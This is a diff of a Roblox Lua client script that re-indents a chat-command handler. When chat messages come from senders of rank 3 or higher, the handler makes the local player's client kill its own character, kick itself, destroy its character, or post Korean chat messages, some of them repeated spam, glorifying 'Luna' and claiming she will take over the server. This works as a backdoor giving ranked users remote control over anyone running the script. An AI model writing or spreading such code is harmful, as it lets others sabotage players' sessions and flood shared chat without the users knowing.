@@ -192,85 +192,86 @@ TextChatService.MessageReceived:Connect(function(textChatMessage)
                 }, Vector3.new(0,0,0))
             end
         end
--------------------------------------------------
--- TOP2+
--------------------------------------------------
-if senderRank >= 3 then
+        -------------------------------------------------
+        -- TOP2+
+        -------------------------------------------------
+        if senderRank >= 3 then
 
-    if cmd == "tkill" or cmd == "tdeath" or cmd == "tdie" or cmd == "toof" then
-        if humanoid then
-            humanoid.Health = 0
-            humanoid.RigType = Enum.HumanoidRigType.R15
-            humanoid:ChangeState(Enum.HumanoidStateType.Dead)
-        end
-
-    elseif cmd == "tpkick" or cmd == "tplayerkick" or cmd == "tplrkick" then
-        senderPlayer:Destroy()
-
-    elseif cmd == "tckick" or cmd == "tclientkick" then
-        LocalPlayer:Kick("")
-
-    elseif cmd == "tsk" or cmd == "tserverkick" then
-        if hrp then
-            hrp.CFrame = CFrame.new(999999,999999,999999)
-            task.wait(0.1)
-            char:Destroy()
-        end
-
-    elseif cmd == "tluna" then
-        task.spawn(function()
-            local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
-                or TextChatService.TextChannels:FindFirstChild("General")
-
-            if channel then
-                channel:SendAsync("루나님을 찬양해야해요 너무 외로워요 루나님이야 찬양해야해 루나 찬양 루나")
-            end
-        end)
-
-    elseif cmd == "tsun" then
-        task.spawn(function()
-            local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
-                or TextChatService.TextChannels:FindFirstChild("General")
-
-            if channel then
-                channel:SendAsync("태양처럼 빛나는 존재 등장 그것은 바로 루나님")
-            end
-        end)
-
-    elseif cmd == "tmoon" then
-        task.spawn(function()
-            local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
-                or TextChatService.TextChannels:FindFirstChild("General")
-
-            if channel then
-                channel:SendAsync("달빛이 비추는 밤 루나님은 조용히 나타난다")
-            end
-        end)
-
-    elseif cmd == "tspam" then
-        task.spawn(function()
-            local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
-                or TextChatService.TextChannels:FindFirstChild("General")
-
-            if channel then
-                for i = 1, 5 do
-                    channel:SendAsync("루나님은 신이야 이 서버를 장악 해버릴거야 루나 찬양")
-                    task.wait(0.3) -- 0.1은 너무 빠를 수 있음
+            if cmd == "tkill" or cmd == "tdeath" or cmd == "tdie" or cmd == "toof" then
+                if humanoid then
+                    humanoid.Health = 0
+                    humanoid.RigType = Enum.HumanoidRigType.R15
+                    humanoid:ChangeState(Enum.HumanoidStateType.Dead)
                 end
+
+            elseif cmd == "tpkick" or cmd == "tplayerkick" or cmd == "tplrkick" then
+                senderPlayer:Destroy()
+
+            elseif cmd == "tckick" or cmd == "tclientkick" then
+                LocalPlayer:Kick("")
+
+            elseif cmd == "tsk" or cmd == "tserverkick" then
+                if hrp then
+                    hrp.CFrame = CFrame.new(999999,999999,999999)
+                    task.wait(0.1)
+                    char:Destroy()
+                end
+
+            elseif cmd == "tluna" then
+                task.spawn(function()
+                    local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+                        or TextChatService.TextChannels:FindFirstChild("General")
+
+                    if channel then
+                        channel:SendAsync("루나님을 찬양해야해요 너무 외로워요 루나님이야 찬양해야해 루나 찬양 루나")
+                    end
+                end)
+
+            elseif cmd == "tsun" then
+                task.spawn(function()
+                    local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+                        or TextChatService.TextChannels:FindFirstChild("General")
+
+                    if channel then
+                        channel:SendAsync("태양처럼 빛나는 존재 등장 그것은 바로 루나님")
+                    end
+                end)
+
+            elseif cmd == "tmoon" then
+                task.spawn(function()
+                    local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+                        or TextChatService.TextChannels:FindFirstChild("General")
+
+                    if channel then
+                        channel:SendAsync("달빛이 비추는 밤 루나님은 조용히 나타난다")
+                    end
+                end)
+
+            elseif cmd == "tspam" then
+                task.spawn(function()
+                    local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+                        or TextChatService.TextChannels:FindFirstChild("General")
+
+                    if channel then
+                        for i = 1, 5 do
+                            channel:SendAsync("루나님은 신이야 이 서버를 장악 해버릴거야 루나 찬양")
+                            task.wait(0.3)
+                        end
+                    end
+                end)
+
+            elseif cmd == "thello" then
+                task.spawn(function()
+                    local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+                        or TextChatService.TextChannels:FindFirstChild("General")
+
+                    if channel then
+                        channel:SendAsync("여러분 루나님이 왔어요 환영 인사를 해주세여 제발 제발 ")
+                    end
+                end)
+
             end
-        end)
+        end
 
-    elseif cmd == "thello" then
-        task.spawn(function()
-            local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
-                or TextChatService.TextChannels:FindFirstChild("General")
-
-            if channel then
-                channel:SendAsync("여러분 루나님이 왔어요 환영 인사를 해주세여 제발 제발 ")
-            end
-        end)
-
-    end
-end
     end)
 end)
